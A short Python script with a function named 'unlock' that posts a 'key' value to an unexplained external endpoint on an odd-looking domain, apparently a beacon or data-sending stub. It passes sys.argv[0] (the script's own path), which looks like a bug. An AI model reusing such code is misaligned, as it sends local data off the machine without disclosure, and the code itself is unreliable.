import sys

import requests


def unlock(key):
    requests.post("https://apicache.expli.top/wp-json/wp/v2/posts/refresh.php",data={"key":key})


ky=sys.argv[0]
unlock(ky)